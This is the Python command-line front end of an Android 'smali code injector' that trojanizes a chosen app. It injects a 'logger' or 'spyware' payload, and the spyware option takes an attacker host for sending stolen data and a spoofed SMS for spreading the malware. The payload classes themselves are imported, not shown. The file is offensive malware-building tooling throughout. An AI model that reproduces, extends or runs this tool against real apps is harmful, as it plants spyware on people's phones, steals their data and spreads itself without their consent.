#!/usr/bin/env python
#    Copyright (C) 2015 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

import argparse
import os
import shutil
import sys

from payloads.logger import Logger
from payloads.spyware import Spyware
from reverse_engineer import reverse_engineer
from utils import config, logger

# Instanciate a custom output logger
logger = logger.get_logger()

# Implemented payloads
payloads = [
    "logger",
    "spyware"
]


def banner():
    banner = """
       d888888o.       ,o888888o.     8 8888
     .`8888:' `88.    8888     `88.   8 8888
     8.`8888.   Y8 ,8 8888       `8.  8 8888
     `8.`8888.     88 8888            8 8888
      `8.`8888.    88 8888            8 8888
       `8.`8888.   88 8888            8 8888
        `8.`8888.  88 8888            8 8888
    8b   `8.`8888. `8 8888       .8'  8 8888
    `8b.  ;8.`8888    8888     ,88'   8 8888
     `Y8888P ,88P'     `8888888P'     8 8888
    """
    print("{}".format(banner))


def copyright():
    copyright = """
           =[ smali-code-injector v1.1-dev       ]
    + -- --=[ Alexandre Teyar @Ares              ]
    + -- --=[ Pentester at Ambersail Ltd.        ]
    + -- --=[ GitHub: https://github.com/AresS31 ]
    """
    print("{}".format(copyright))


def parse_args():
    """
    Parse and validate user command line.
    """
    parser = argparse.ArgumentParser(
        description="Android assembly code (smali) injector"
    )

    parser.add_argument(
        "-a",
        "--app",
        dest="app",
        help="Android application to trojanize",
        required=True,
        type=argparse.FileType('r')
    )

    subparsers = parser.add_subparsers(
        dest="payload, search",
        help="available commands"
    )

    subparsers.required = True

    # Parser for the "search" command
    parser_search = subparsers.add_parser(
        "search",
        help="search command - identifies the main activity"
    )

    parser_search.set_defaults(command='search')

    # Parser for the "payload" command
    parser_payload = subparsers.add_parser(
        "payload",
        help="payload command"
    )

    parser_payload.set_defaults(command='payload')

    parser_payload.add_argument(
        "-d",
        "--dest",
        dest="destination",
        help="the destination file or directoy for injection filtering",
        default='',
        required=False,
        type=str
    )

    parser_payload.add_argument(
        "-k",
        "--keywords",
        dest="keywords",
        help="keywords (separated by ',') for injection filtering",
        default="-1",
        required=False,
        type=str
    )

    parser_payloads = parser_payload.add_subparsers(
        dest=", ".join(payloads),
        help="available commands"
    )

    parser_payloads.required = True

    # Parser for the "payload->logger" command
    parser_payload_logger = parser_payloads.add_parser(
        "logger",
        help="logger command"
    )

    parser_payload_logger.set_defaults(payload_name='logger')

    # Parser for the "payload->logger" command
    parser_payload_spyware = parser_payloads.add_parser(
        "spyware",
        help="spyware command",
    )

    parser_payload_spyware.add_argument(
        "-ppg",
        "--propagate",
        dest="propagate",
        help="spoofed SMS to send for the malware propagation",
        required=False,
        type=str
    )

    parser_payload_spyware.add_argument(
        "-rh",
        "--rhost",
        dest="rhost",
        help="attacker's host/ip for stolen data transmission",
        required=True,
        type=str
    )

    parser_payload_spyware.set_defaults(payload_name='spyware')

    return parser.parse_args()


def main():
    try:
        banner()
        copyright()

        args = parse_args()

        if (args.command == "search"):
            logger.info("identifying the main activity...")
            main_activity = reverse_engineer.get_main_activity(args.app.name)
            logger.success("{}".format(main_activity))

        elif (args.command == "payload"):
            if(args.payload_name == "spyware"):
                payload = Spyware(args)
            elif (args.payload_name == "logger"):
                payload = Logger(args)

            payload.run()

    except KeyboardInterrupt:
        logger.error("CTRL+C pressed, exiting...")

        if os.path.exists(config.TMP_FOLDER):
            shutil.rmtree(config.TMP_FOLDER, ignore_errors=True)

        sys.exit(1)


if __name__ == "__main__":
    main()
